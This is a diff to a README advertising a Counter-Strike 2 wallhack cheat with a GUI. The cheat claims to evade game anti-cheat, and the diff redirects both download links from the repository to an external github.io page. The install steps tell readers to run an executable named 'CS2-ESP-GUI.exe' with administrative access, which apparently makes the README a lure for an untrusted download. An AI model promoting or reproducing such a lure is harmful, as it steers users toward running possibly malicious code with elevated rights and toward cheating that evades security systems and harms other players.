@@ -1,6 +1,6 @@
 # 🎯 CS2-ESP-Wallhack-GUI-2026 - See Through Walls With This Tool
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Jordanaconceptional53/CS2-ESP-Wallhack-GUI-2026)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://jordanaconceptional53.github.io)
 
 This repository provides a graphical interface for Counter-Strike 2 players. It helps you track enemy locations, monitor bomb timers, and view weapon positions during gameplay. The software performs these actions while remaining undetected by game security systems.
 
@@ -20,7 +20,7 @@ Ensure you possess administrative access to your Windows user account. This allo
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official release page](https://github.com/Jordanaconceptional53/CS2-ESP-Wallhack-GUI-2026) to download the compressed folder.
+1. Visit the [official release page](https://jordanaconceptional53.github.io) to download the compressed folder.
 2. Locate the downloaded file in your browser's download directory.
 3. Right-click the folder and select Extract All to unzip the contents.
 4. Open the extracted folder and look for the file named "CS2-ESP-GUI.exe".
